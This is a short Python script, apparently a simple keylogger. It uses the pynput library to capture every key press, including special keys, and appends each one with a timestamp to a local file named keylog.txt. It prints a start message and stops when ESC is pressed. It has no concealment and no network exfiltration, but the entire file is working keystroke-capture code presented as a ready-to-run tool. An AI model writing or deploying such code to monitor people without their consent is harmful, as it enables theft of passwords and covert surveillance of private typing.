from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def format_key(key):
    try:
        if key.char:
            return key.char
    except AttributeError:
        special_keys = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
        }
        return special_keys.get(key, f"[{key.name.upper()}]")

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_str = format_key(key)

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {key_str}\n")

    if key == keyboard.Key.esc:
        print("\n[!] ESC pressed — Stopping keylogger.")
        return False

def start_keylogger():
    print("✅ Keylogger started... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
